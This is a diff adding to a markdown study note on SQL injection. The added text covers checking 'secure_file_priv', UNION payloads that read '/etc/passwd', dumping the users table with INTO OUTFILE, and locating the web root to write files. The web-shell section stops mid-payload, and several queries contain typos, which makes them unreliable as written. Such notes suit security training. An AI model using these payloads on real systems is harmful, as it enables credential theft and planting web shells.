@@ -75,3 +75,17 @@ Payload : `value' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -`
 
 ## Writing Files
 The [secure_file_priv](https://mariadb.com/kb/en/server-system-variables/#secure_file_priv) variable is used to determine where to read/write files from. An empty value lets us read files from the entire file system. Otherwise, if a certain directory is set, we can only read from the folder specified by the variable. On the other hand, `NULL` means we cannot read/write from any directory. MariaDB has this variable set to empty by default, which lets us read/write to any file if the user has the `FILE` privilege. However, `MySQL` uses `/var/lib/mysql-files` as the default folder. This means that reading files through a `MySQL` injection isn't possible with default settings. Even worse, some modern configurations default to `NULL`, meaning that we cannot read/write files anywhere within the system.
+
+Query to check the variable : `SHOW VARIABLES LIKE 'secure_file_priv';`
+Now, we need to check the table of information_schema to know about the variable value. The query for that would be : `SELECT variable_name, variable+value FROM information_schema.gloabal_variables WHERE variable_name="secure_fle_priv";`
+Now the payload for this becomes : `value' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables WHERE variable_name="secure_file_priv"-- -`
+
+## Select INTO OUTFILE
+`SELECT * FROM users INTO OUTFILE '/tmp/credentials';` : Saves the output of the users table into the /tmp/credentials.
+
+>**Note:** To write a web shell, we must know the base web directory for the web server (i.e. web root). One way to find it is to use `load_file` to read the server configuration, like Apache's configuration found at `/etc/apache2/apache2.conf`, Nginx's configuration at `/etc/nginx/nginx.conf`, or IIS configuration at `%WinDir%\System32\Inetsrv\Config\ApplicationHost.config`, or we can search online for other possible configuration locations. Furthermore, we may run a fuzzing scan and try to write files to different possible web roots, using [this wordlist for Linux](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt) or [this wordlist for Windows](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt). Finally, if none of the above works, we can use server errors displayed to us and try to find the web directory that way.
+
+So the payload to write the file becomes : `value' UNION SELECT 1, 'file written successfully!', 3, 4 INT O OUTFILE '/var/www/html/proof.txt'-- -`
+
+## Writing a Web Shell
+`value' UNION SELECT "", `
